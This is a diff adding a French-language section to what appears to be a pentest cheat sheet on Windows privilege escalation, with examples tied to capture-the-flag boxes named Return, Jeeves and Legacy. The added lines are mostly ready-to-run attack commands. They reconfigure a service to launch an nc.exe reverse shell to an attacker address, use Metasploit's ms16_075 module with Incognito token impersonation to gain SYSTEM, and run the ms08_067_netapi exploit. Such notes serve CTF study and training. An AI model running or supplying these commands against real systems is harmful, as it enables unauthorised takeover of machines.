@@ -44,3 +44,39 @@ takeown /f "C:\path\to\file.txt"
 # Modify permissions to gain full access
 icacls "C:\path\to\file.txt" /grant username:F
 ```
+## Techniques d'élévation de privilèges Windows dans des Box
+### Exploitation des groupes de sécurité
+Exemple (Return):
+```bash
+# Vérifier les appartenances aux groupes
+whoami /all
+
+# Exploitation du groupe Server Operators
+sc.exe config <SERVICE> binPath="C:\path\to\nc.exe -e cmd.exe <IP> <PORT>"
+sc.exe stop <SERVICE>
+sc.exe start <SERVICE>
+```
+### Exploitation des droits SeImpersonate
+Exemple (Jeeves):
+```bash
+# Utiliser Metasploit pour l'exploitation
+use exploit/windows/local/ms16_075_reflection
+set SESSION <SESSION_ID>
+set LHOST <IP>
+set LPORT <PORT>
+exploit
+
+# Utiliser Incognito pour l'usurpation de jetons
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+```
+### Exploitation des vulnérabilités connues
+Exemple (Legacy):
+```bash
+# Exploitation de MS08-067
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTS <IP>
+set LHOST <IP>
+exploit
+```
